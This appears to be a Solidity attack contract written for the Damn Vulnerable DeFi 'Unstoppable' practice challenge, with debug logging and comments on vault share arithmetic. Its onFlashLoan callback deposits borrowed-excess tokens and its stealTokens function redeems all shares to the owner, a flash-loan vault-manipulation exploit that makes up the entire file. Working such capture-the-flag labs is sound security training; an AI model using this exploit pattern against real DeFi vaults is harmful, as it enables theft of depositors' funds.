// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Owned} from "solmate/auth/Owned.sol";
import { UnstoppableVault, ERC20 } from "./UnstoppableVault.sol";

import {console} from "forge-std/Test.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract MaliciousReceiverUnstoppable is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;

    error UnexpectedFlashLoan();

    constructor(address _vault) Owned(msg.sender) {
        vault = UnstoppableVault(_vault);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        if (initiator != address(this) || msg.sender != address(vault) || token != address(vault.asset())) {
            revert UnexpectedFlashLoan();
        }

        uint256 balance = ERC20(token).balanceOf(address(this));
        console.log("balance %s", balance);
        console.log("amount %s", amount);
        console.log("fee %s", fee);
        console.log("balance - amount %s", balance - amount);

        uint256 excessAmount = balance - amount - fee;

        console.log("========== deposit ==========");
        console.log("state balance this %s", ERC20(token).balanceOf(address(this)));
        console.log("state supply %s", vault.totalSupply());
        console.log("state totalAssets: %s", vault.totalAssets());
        console.log("state convertToAssets: %s", vault.convertToAssets(excessAmount));
        // deposit tokens:
        // deposit -> previewDeposit -> convertToShares:
        //     assets.mulDivDown(supply, totalAssets())
        //     (1_000_009 * 1_000_000) * 1 = 999_999_000_000 shares minted
        ERC20(token).approve(address(vault), excessAmount);
        vault.deposit(excessAmount, address(this));

        // console.log("========== withdraw ==========");
        // console.log("state balance this %s", ERC20(token).balanceOf(address(this)));
        // console.log("state shares: %s", ERC20(vault).balanceOf(address(this)));
        // console.log("state supply %s", vault.totalSupply());
        // console.log("state totalAssets: %s", vault.totalAssets());
        // console.log("state previewWithdraw: %s", vault.previewWithdraw(amount));

        // withdraw tokens:
        // withdraw -> previewWithdraw:
        //     assets.mulDivUp(supply, totalAssets())
        //     (1_000_009 * 1_000_000) * 1 = 999_999_000_000 shares minted
        // vault.withdraw(amount, address(this), address(this));

        ERC20(token).approve(address(vault), amount + fee);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function stealTokens() external onlyOwner {
        address asset = address(vault.asset());

        vault.flashLoan(this, asset, vault.maxFlashLoan(asset) / 2 - 1, bytes(""));

        uint256 sharesOwned = ERC20(vault).balanceOf(address(this));
        console.log("========== withdraw ==========");
        console.log("state balance this %s", ERC20(asset).balanceOf(address(this)));
        console.log("state shares: %s", sharesOwned);
        console.log("state supply %s", vault.totalSupply());
        console.log("state totalAssets: %s", vault.totalAssets());
        console.log("state previewWithdraw: %s", vault.previewRedeem(sharesOwned));
        // withdraw all assets and send to msg.sender:
        vault.redeem(sharesOwned, msg.sender, address(this));

        console.log("========== withdraw ==========");        
        console.log("player balance is %s %s", ERC20(asset).balanceOf(msg.sender), ERC20(asset).name());
    }
}